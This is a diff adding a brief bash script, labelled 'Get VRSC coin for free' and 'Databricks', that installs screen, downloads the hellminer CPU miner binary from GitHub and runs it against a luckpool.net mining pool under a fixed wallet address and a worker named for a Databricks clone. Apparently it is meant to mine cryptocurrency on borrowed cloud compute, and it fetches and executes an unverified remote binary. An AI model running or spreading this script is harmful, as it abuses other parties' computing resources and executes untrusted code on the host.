@@ -1,0 +1,11 @@
+#! /bin/bash
+# Get VRSC coin for free
+# Databricks
+sudo apt update
+clear
+sudo apt install screen
+screen -R VRSC
+ 
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz &&
+tar xf hellminer_cpu_linux.tar.gz &&
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RRJZCChJw1VRW3qm4gy2p2eVhi1auF2c84.DATABRICKclone1 -p d=4096,xn=5F,t=1,hybrid --cpu 2
